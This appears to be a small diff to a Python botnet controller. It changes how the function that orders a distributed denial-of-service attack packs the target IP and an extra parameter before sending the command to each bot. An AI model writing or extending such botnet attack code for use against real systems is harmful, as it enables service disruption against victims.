@@ -50,7 +50,7 @@ def send_dos_attack(payload):
 
 def send_ddos_attack(payload):
     target_ip = str(payload.split(",")[1])
-    msg_contents = "DOS," + target_ip
+    msg_contents = "DOS," + target_ip + ',' + payload.split(',')[2]
     for bot in botnet:
         Messenger.send_message(bot, VICTIM_PORT, msg_contents)
     print "DDOS'd attack to ip: %s" % str(target_ip)
